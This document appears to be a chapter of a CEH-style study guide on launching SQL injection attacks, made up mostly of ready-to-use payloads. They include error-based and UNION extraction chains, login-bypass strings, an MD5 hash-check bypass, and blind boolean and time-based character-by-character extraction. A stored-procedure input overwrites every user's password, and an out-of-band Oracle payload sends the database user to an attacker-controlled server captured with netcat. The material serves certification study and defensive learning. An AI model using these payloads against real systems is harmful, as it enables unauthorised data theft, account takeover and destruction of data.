# 04 — SQL Injection Methodology: Launching SQL Injection Attacks

Once information gathering and vulnerability detection are done, the attacker moves to actually launching attacks —
error-based, UNION-based, blind, and beyond — to extract real data from the target.

## Perform Error-Based SQL Injection (Full Data Extraction Chain)

An attacker uses database-level error messages disclosed by the application to build a full data-extraction chain.
This classic MSSQL/ASPX technique abuses a **type-conversion error** (`CONVERT`) so that the error message itself
leaks the string value being converted.

```sql
-- 1. Extract Database Name
http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int,(DB_NAME))--
-- → "Syntax error converting the nvarchar value '[DB NAME]' to a column of data type int."

-- 2. Extract 1st Database Table
http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85)))--
-- → reveals '[TABLE NAME 1]'

-- 3. Extract 1st Table's Column Name
http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int,(select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'))--
-- → reveals '[COLUMN NAME 1]'

-- 4. Extract 1st Field of 1st Row (actual data)
http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int,(select top 1 COLUMN-NAME-1 from TABLE-NAME-1))--
-- → reveals '[FIELD 1 VALUE]'
```

Each step forces the database to try converting a string result into an `int`, which fails — and the failure message
includes the exact string it failed to convert. Repeat step 3/4 with `> 'last value'` filters to page through every
column and every row.

## Perform Error-Based SQL Injection Using Stored Procedure Injection

If a stored procedure builds SQL dynamically without sanitizing its inputs, it's exploitable the same way.

**Example 1 — authentication bypass via a vulnerable stored procedure:**

```sql
Create procedure user_login @username varchar(20), @passwd varchar(20) As
Declare @sqlstring varchar(250)
Set @sqlstring = ' Select 1 from users Where username = ' + @username + ' and passwd = ' + @passwd
exec(@sqlstring)
Go
```

Malicious input: `anyusername or 1=1' anypassword` — the procedure doesn't sanitize input, so the query returns an
existing record regardless of the actual password.

**Example 2 — dynamic reporting query leading to mass data modification:**

```sql
Create procedure get_report @columnnamelist varchar(7900) As Declare @sqlstring varchar(8000)
Set @sqlstring = ' Select ' + @columnnamelist + ' from ReportTable' exec(@sqlstring) Go
```

Malicious input: `1 from users; update users set password = 'password'; select *`

Result: the report runs **and** every user's password gets overwritten. (Note: real risk here is any dynamic
reporting query where the user selects which columns to view — that's exactly where malicious code can be smuggled in.)

## Perform UNION SQL Injection (Full Data Extraction Chain)

The attacker checks for UNION vulnerability by appending a single quote to the end of a `.php?id=` parameter — a
MySQL-style error response suggests the site is vulnerable. From there, use `ORDER BY` to find the column count, then
`UNION ALL SELECT` to extract data:

```sql
-- 1. Extract Database Name
http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,DB_NAME,3,4--
-- → [DB_NAME] returned from the server

-- 2. Extract Database Tables
http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,TABLE_NAME,3,4 from sysobjects where xtype=char(85)--
-- → [EMPLOYEE_TABLE] returned

-- 3. Extract Table Column Names
http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,column_name,3,4 from DB_NAME.information_schema.columns where table_name ='EMPLOYEE_TABLE'--
-- → [EMPLOYEE_NAME]

-- 4. Extract 1st Field Data
http://www.certifiedhacker.com/page.aspx?id=1 UNION SELECT ALL 1,COLUMN-NAME-1,3,4 from EMPLOYEE_NAME --
-- → [FIELD 1 VALUE] returned from the server
```

## Bypass Website Logins Using SQL Injection

Login-form authentication bypass is the most fundamental and common malicious use of SQLi — no valid username or
password required.

**Classic login-bypass payloads to try in any login form:**

```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
```

**Log in as a specific/different user via UNION:**

```sql
' UNION SELECT 1,'anotheruser','doesnt matter', 1--
```

**Bypass an MD5 hash check** by UNIONing a known password's MD5 hash with a supplied password:

```
Username: admin
Password: 1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055
```

`81dc9bdb52d04dc20036dbd8313ed055` is `MD5('1234')` — the app ends up comparing the supplied hash to itself instead of
validating against the real database value.

## Perform Blind SQL Injection — Boolean Exploitation (MySQL, Character-by-Character)

Blind SQLi reads data **symbol by symbol**, merging two queries via the `UNION` operator or a boolean condition:

```
-- Extract 1st character of 1st table entry
/?id=1+AND+555=if(ord(mid((select+pass+from+users+limit+0,1),1,1))=97,555,777)
```

If table `users` has a `pass` column and its 1st entry's 1st character is `97` (`'a'`), the DBMS returns **TRUE**
(page shows the 555-branch); otherwise **FALSE** (777-branch).

```
-- Extract 2nd character (change the substring position argument)
/?id=1+AND+555=if(ord(mid((select+pass+from+users+limit+0,1),2,1))=97,555,777)
```

## Blind SQL Injection — Full Time-Based Extraction Chain (MSSQL `WAITFOR DELAY`)

This is the canonical blind-SQLi data-exfiltration pattern tested throughout CEH: for **any** target value (a
username, a database name, a table name, a column name, or a row's data), you extract it in two stages:

1. **Find the length** by incrementing `N` until the DB delays (TRUE):
   ```sql
   IF (LEN(<subquery>)=N) WAITFOR DELAY '00:00:10'--
   ```
2. **Find each character** by incrementing an ASCII guess until the DB delays (TRUE):
   ```sql
   IF(ASCII(lower(substring((<subquery>),position,1)))=asciiVal) WAITFOR DELAY '00:00:10'--
   ```

A 10-second delay = **TRUE**; an instant response = **FALSE**. Repeat per character position, and per target.

### Extract Database User

Binary search on ASCII value needs ~7 requests per character; an 8-character username needs ~56 requests.

```sql
-- Check username length
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--
-- keep incrementing until DBMS returns TRUE

-- Check character 1 (try 'a'=97, 'b'=98, 'c'=99, ...)
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--

-- Check character 2 (position argument = 2)
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((USER),2,1)))=97) WAITFOR DELAY '00:00:10'--
-- ...and so on for character 3, 4, 5...
```

### Extract Database Name

```sql
-- Check name length
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(DB_NAME())=4) WAITFOR DELAY '00:00:10'--

-- Check each character (example resolves to "ABCD")
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((DB_NAME()),1,1)))=97) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((DB_NAME()),2,1)))=98) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((DB_NAME()),3,1)))=99) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((DB_NAME()),4,1)))=100) WAITFOR DELAY '00:00:10'--
-- Database Name = ABCD (once all four TRUE responses are found)
```

### Extract 1st Database Table

```sql
-- Check table name length
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 NAME from sysobjects where xtype='U')=3) WAITFOR DELAY '00:00:10'--

-- Check each character (example resolves to "EMP")
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),1,1)))=101) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),2,1)))=109) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((SELECT TOP 1 NAME from sysobjects where xtype=char(85)),3,1)))=112) WAITFOR DELAY '00:00:10'--
-- Table Name = EMP
```

### Extract Column Names

To page past a column you've already found, add `AND column_name>'<last found name>'` — this walks through all
columns alphabetically.

```sql
-- 1st column: length then characters (resolves to "EID")
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 column_name from ABCD.information_schema.columns where table_name='EMP')=3) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((SELECT TOP 1 column_name from ABCD.information_schema.columns where table_name='EMP'),1,1)))=101) WAITFOR DELAY '00:00:10'--
-- ... (repeat per character)

-- 2nd column: same pattern, but exclude the column already found (resolves to "DEPT")
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 column_name from ABCD.information_schema.columns where table_name='EMP' and column_name>'EID')=4) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF(ASCII(lower(substring((SELECT TOP 1 column_name from ABCD.information_schema.columns where table_name='EMP' and column_name>'EID'),1,1)))=100) WAITFOR DELAY '00:00:10'--
-- ... (repeat per character)
```

### Extract Data From Rows

Same length-then-characters pattern, just targeting an actual data column instead of metadata:

```sql
-- 1st field of 1st row (EID column, resolves to "JOE")
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 EID from EMP)=3) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(substring((SELECT TOP 1 EID from EMP),1,1))=106) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(substring((SELECT TOP 1 EID from EMP),2,1))=111) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(substring((SELECT TOP 1 EID from EMP),3,1))=101) WAITFOR DELAY '00:00:10'--

-- 2nd field of 1st row (DEPT column, resolves to "COMP")
http://www.certifiedhacker.com/page.aspx?id=1; IF (LEN(SELECT TOP 1 DEPT from EMP)=4) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(substring((SELECT TOP 1 DEPT from EMP),1,1))=100) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(substring((SELECT TOP 1 DEPT from EMP),2,1))=111) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(substring((SELECT TOP 1 DEPT from EMP),3,1))=109) WAITFOR DELAY '00:00:10'--
http://www.certifiedhacker.com/page.aspx?id=1; IF (ASCII(substring((SELECT TOP 1 DEPT from EMP),3,1))=112) WAITFOR DELAY '00:00:10'--
```

> This same DB-name → table → column → row-data chain is the standard blind time-based SQLi exfiltration
> methodology — memorize the *pattern*, not the specific example values.

## Exporting a Value with a Regular Expression Attack (Binary Search)

If you know the target table (e.g. `UserInfo` storing hashed passwords — remember, hashed values only ever contain
`[a-f0-9]`), you can binary-search each character much faster than a linear ASCII scan.

**MySQL (`REGEXP`):**

```sql
-- Check if 1st char is in [a-f]
index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[a-f]' AND ID=2)
-- TRUE → narrow to [a-c]
index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[a-c]' AND ID=2)
-- FALSE → must be in [d-f]
index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[d-f]' AND ID=2)
-- TRUE → narrow to [d-e]
index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[d-e]' AND ID=2)
-- TRUE → test exactly 'd'
index.php?id=2 and 1=(SELECT 1 FROM UserInfo WHERE Password REGEXP '^[d]' AND ID=2)
-- TRUE → 1st character = 'd'
```

Repeat this binary-search process for every remaining character.

**MSSQL (`LIKE`):**

```sql
-- 2nd character (1st already found = 'd')
default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[a-f]%' AND ID=2)   -- FALSE
default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[0-9]%' AND ID=2)   -- TRUE
default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[0-4]%' AND ID=2)   -- FALSE
default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[5-9]%' AND ID=2)   -- TRUE
default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[5-7]%' AND ID=2)   -- FALSE (must be 8 or 9)
default.aspx?id=2 AND 1=(SELECT 1 FROM UserInfo WHERE Password LIKE 'd[8]%' AND ID=2)     -- TRUE → 2nd char = '8'
```

Once the full password is exported this way, log in and proceed.

## Perform Double-Blind SQL Injection

An even more advanced technique for when the attacker gets **no direct feedback at all** — not even a Boolean
true/false page difference.

**How it works:**
1. Find a vulnerable input field that provides no direct feedback (no error message, no data).
2. Craft SQLi payloads that manipulate the database and cause an *observable side effect* elsewhere in the app.
3. Look for **indirect** indicators of success — changes in app behavior, differences in response time, or impacts
   on other DB-dependent functionality.
4. Typically combines Boolean-based and time-based blind techniques.

Exploitation relies on time-delay analysis using `benchmark()` and `sleep()`:

```sql
/?id=1+AND+if((ascii(lower(substring((select password from user limit 0,1),0,1))))=97,1,benchmark(2000000,md5(now())))
```

- A character guess is confirmed correct if the response has a measurable time delay.
- The tuning value (`2000000` here) should be adjusted per-application for acceptable scan performance.
- `sleep()` is functionally the analog of `benchmark()`, but doesn't consume server CPU resources the way
  `benchmark()` does — prefer it where available.

## Perform Blind SQL Injection Using the Out-of-Band Technique

Useful specifically when the tester is stuck in a blind-SQLi scenario with no time-based or boolean signal available
in the normal channel. DBMS-specific functions push data out to a server the attacker controls.

**Oracle example:**

```sql
-- Normal query
SELECT * FROM products WHERE id_product=$id_product
-- Normal request
http://www.example.com/product.php?id=10
-- Malicious request
http://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80')||(SELECT user FROM DUAL)-
```

`UTL_HTTP.request` is concatenated with `10`; Oracle tries to connect to `testerserver` and issue an HTTP GET whose
path contains the result of `SELECT user FROM DUAL`.

**Capturing it — set up a listener on the tester's own server:**

```bash
/home/tester/nc -nLp 80
```

The resulting captured request leaks the database user directly in the request line:

```
GET /SCOTT HTTP/1.1
Host: testerserver.com
Connection: close
```

(Here, `SCOTT` is the leaked Oracle database user.)

## Exploiting Second-Order SQL Injection

Occurs when data submitted by the attacker is **stored** in the database and later reused — unsanitized — to build a
*different* SQL query. This can succeed even when the app applies output escaping on the original input, because the
payload causes no immediate harm and is simply stored as-is.

**Sequence of actions:**
1. The attacker submits a crafted input via an HTTP request.
2. The application saves that input to the database and responds normally (no injection occurs yet).
3. The attacker submits a **second**, unrelated request.
4. The application processes the second request using the **first, previously stored** input, and this time the
   malicious SQL executes.
5. Any results are returned to the attacker in the response to the second request, if applicable.

Depending on the backend DB, connection settings, and OS, second-order SQLi can let an attacker read, update, or
delete arbitrary data/tables, or even execute OS commands.

---

**Previous:** [03 — Methodology: Information Gathering & Vulnerability Detection](03-methodology-information-gathering.md) · **Next:** [05 — Methodology: Advanced SQL Injection](05-methodology-advanced-sql-injection.md)
